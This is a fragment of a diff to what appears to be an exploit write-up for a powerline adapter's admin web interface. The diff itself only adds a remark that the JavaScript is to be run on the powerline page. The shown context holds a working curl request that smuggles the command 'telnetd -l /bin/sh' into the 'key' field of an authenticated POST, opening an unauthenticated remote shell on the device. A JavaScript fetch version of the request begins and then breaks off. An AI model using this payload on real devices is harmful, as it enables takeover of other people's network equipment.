@@ -11,7 +11,7 @@ Send an authenticated HTTP POST request to `http://${powerline_url}/powerline?fo
 ```bash
 curl 'http://${powerline_url}/admin/powerline?form=plc_device' -X POST -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: ${powerline_url}/' -H 'Origin: ${powerline_url}' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: Authorization=${authorization_cookie}' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'operation=remove&key=1;telnetd -l /bin/sh'
 ```
-or this JavaScript fetch code:
+or this JavaScript fetch code (run on powerline page):
 ```javascript
 await fetch(`http://${powerlineUrl}/admin/powerline?form=plc_device`, {
     "credentials": "include",
